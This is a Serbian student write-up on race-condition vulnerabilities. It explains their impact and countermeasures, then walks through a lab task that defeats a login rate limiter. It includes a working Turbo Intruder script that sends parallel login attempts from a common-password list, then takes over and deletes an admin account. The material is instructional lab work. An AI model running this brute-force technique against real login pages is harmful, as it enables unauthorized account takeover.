# Trka uslova - Ilija Jordanovski SV 73/2022

Trka uslova (eng. *race condition*) je kategorija ranjivosti koja nastaje kada server obrađuje više zahteva istovremeno bez adekvatne zaštite. Ovakva ranjivost može dovesti do toga da više različitih niti radi sa istim podacima u isto vreme što može da stvori "koliziju" koja prouzrokuje nedefinisano ponašanje servera. Napadi trkom uslova namerno prouzrokuju kolizije kako bi zloupotrebili nedefinisano ponašanje u maliciozne svrhe.

Vremenski okvir u kojem je moguća kolizija naziva se "prozor trke" (eng. *race window*), i uticaj trke uslova zavisi od dela sistema u kojem se javlja.

## Uticaj trke uslova

- **Finansijska šteta** - višestruke transakcije gde treba da se desi samo jedna
- **Korupcija podataka** - nekonzistentno stanje u bazi podataka
- **Uskraćivanje usluge** - dovođenje sistema u zastoj (eng. *deadlock*)
- **Zaobilaženje autentifikacije i porast pristupa** - pristup osetljivim delovima sistema

## Ranjivosti u softveru koje dopuštaju napad

- **Neatomične operacije** - istovremeno čitanje i pisanje bez zaštite. Baza podataka bi trebalo da je atomična ali operacije sa podacima van nje nisu podrazumevano atomične.
- **Nedostatak sinhronizacije** - pri asinhronom radu sa podacima se koriste strukture podataka poput **mutex**-a, **semafora**, **lock**-ova. U slučaju njihovog odsustva može doći do kolizija.
- **Upravljanje sesijom** - ako se identifikator sesije proverava i koristi na različitim mestima, vreme između se može smatrati prozorom trke.
- **Manipulisanje fajlsistemom** - ukoliko sistemski pozivi poput `stat()` i `open()` nisu deo jedne atomične operacije, vreme između poziva se može iskoristiti kako bi se npr. fajl zamenio symlinkom.
- **Transakcije baze podataka** - ako se pri ažuriranju podataka u SQL bazi odvojeno pozivaju `SELECT` i `UPDATE` upiti jedan za drugim, umesto da se koristi `SELECT FOR UPDATE`, prostor između izvršavanja tih upita može biti prozor trke.

## Primerene kontramere

- **Ograničavanje broja zahteva** - (eng. *rate limiting*) ograničavanjem broja zahteva koje korisnik može da pošalje sa iste sesije u određenom vremenskom periodu se mogu uočiti neuobičajeni obrasci i sprečiti nepoželjno ponašanje.
- **Upotreba atomičnih upita** - `SELECT FOR UPDATE` zaključava red u tabeli dok se transakcija ne izvrši.
- **Upotreba prikladnih struktura podataka** - u kodu višenitne obrade korisiti mutexe, semafore... Paziti da ne dođe do zastoja, izgladnjivanja, trke do podataka...
- **Upotreba prikladnih tipova podataka** - moderni programski jezici poseduju tipove koji garantuju atomičnost operacija nad tim tipovima, npr. `AtomicReference` ili `AtomicInteger` u Javi, `atomic` u Rustu, `Interlocked` u C#
- **Jedinstveni tokeni u kritičnim operacijama** - svaki zahtev za kritičnu operaciju dobija jedinstveni token, ako token već postoji zahtev se odbija.
- **Upotreba prikladnih sistemskih poziva** - umesto zasebnih `stat()` i `open()` poziva koristiti `openat()`

# Zadaci

## Zadatak 1 - zeleni

### *Limit overrun race conditions*

Cilj ovog zadatka je kupiti proizvod za koji nemamo sredstava. Napadaču su dati kredencijali za prijavu na web shop na nalog koji ima 50$ za trošenje u prodavnici, i promo kod za 20% popusta sa porudžbine. Proizvod koji treba kupiti košta 1337$, što je mnogo više nego što nalog ima.

Hajde da analiziramo kako izgleda kupovina nekog proizvoda i primena promo koda.

## Zadatak 2 - plavi:

### *Bypassing rate limits via race conditions*

Cilj ovog zadatka je probiti login stranicu veb sajta koji sadrži rate limitovanje na login endpointu, pristupiti administratorskom nalogu i obrisati ga. Napadaču(meni) su poznati administratorsko korisničko ime i spisak lozinki od kojih jedna sigurno odgovara korisničkom imenu, i 15 minuta za izvršavanje napada.

Ukoliko pokušamo jednom da se ulogujemo sa netačnim kredencijalima, dobijamo poruku `Invalid username or password`. Ukoliko pokušamo 3 ili više puta da se ulogujemo sa istim korisničkim imenom ali netačnim lozinkama, dobijamo poruku `You have made too many incorrect login attempts. Please try again in 57 seconds`, što ukazuje na prisustvo neke vrste rate-limitera. Ako odmah nakon ovoga pokušamo da se ulogujemo sa drugim korisničkim imenom i netačnom lozinkom, ponovo dobijamo poruku `Invalid username or password`, što nam govori da rate-limitovanje nije vezano za trenutnu sesiju već server pamti broj pokušaja za svako korisničko ime.

Ovo ukazuje na potencijalnu slabost kroz trku uslova, koja se dešava kada server proverava broj pokušaja prijave za određeno korisničko ime.

Pored korisničkog imena naloga kojem treba pristupiti, napadač ima i validne kredencijale običnog korisnika. Ovi kredencijali nam mogu poslužiti da analiziramo kako sistem obrađuje login zahteve. Nakon uspešne prijave, analizom HTTP saobraćaja uočavamo da je poslat `POST` HTTP zahtev na endpoint `/login`. U telu zahteva pronalazimo parametre `username` i `password` sa vrednostima korisničkog imena i lozinke.

Ako pokušamo da pošaljemo više netačnih zahteva od jednom u sekvenci, primetimo da je odgovor na prva tri zahteva `Invalid username or password`, a na svim nakon trećeg `You have made too many incorrect login attempts. Please try again in 57 seconds`. Ako pokušamo da paralelno pošaljemo više zahteva, primetimo da čak i nakon trećeg zahteva dobijamo odgovor `Invalid username or password`. `You have made too many incorrect login attempts. Please try again in 57 seconds` se javlja tek na sedmom zahtevu. Ovo potvrđuje sumnju da slabost postoji.

Ručno podešavanje svakog zahteva bi oduzelo dosta vremena, i dobro bi bilo ako bi mogli da dinamički formiramo zahteve na osnovu liste lozinki koju imamo. Ovo se može realizovati pomoću BurpSuite ekstenzije **Turbo Intruder**, koja dopušta formiranje i slanje HTTP zahteva pomoću Python skripti.

Nakon što pošaljemo zahtev u Turbo Intruder, u gornjoj polovini prozora se vidi sam zahtev, a u donjoj polovini skripta koja ga oblikuje. U zahtevu je neophodno izmeniti polje koje sadrži lozinku na placeholder vrednost `%s`. Skriptu je neophodno izmeniti da sadrži sledeći kod:

```python
def queueRequests(target, wordlists):

    # if the target supports HTTP/2, use engine=Engine.BURP2 to trigger the single-packet attack
    # if they only support HTTP/1, use Engine.THREADED or Engine.BURP instead
    # for more information, check out https://portswigger.net/research/smashing-the-state-machine
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           engine=Engine.BURP2
                           )

    # the 'gate' argument withholds part of each request until openGate is invoked
    # if you see a negative timestamp, the server responded before the request was complete

    wordlist = [
    "123123",
    "abc123",
    "football",
    "monkey",
    "letmein",
    "shadow",
    "master",
    "666666",
    "qwertyuiop",
    "123321",
    "mustang",
    "123456",
    "password",
    "12345678",
    "qwerty",
    "123456789",
    "12345",
    "1234",
    "111111",
    "1234567",
    "dragon",
    "1234567890",
    "michael",
    "x654321",
    "superman",
    "1qaz2wsx",
    "baseball",
    "7777777",
    "121212",
    "00000"
    ]
    
    for word in wordlist:
        engine.queue(target.req, word, gate='race1')

    # once every 'race1' tagged request has been queued
    # invoke engine.openGate() to send them in sync
    engine.openGate('race1')


def handleResponse(req, interesting):
    table.add(req)
```

Nakon što pokrenemo skriptu na dugme `Attack`, slanje zahteva se izvršava i dobijamo tabelu sa rezultatima izvršavanja HTTP zahteva. Tabelu sortiramo po statusnom kodu odgovora, i tražimo status 302. Analizom zahteva sa statusom 302 pronalazimo lozinku, nakon čega se preko web interfejsa prijavljujemo na administratorski nalog i brišemo administratorskog korisnika.
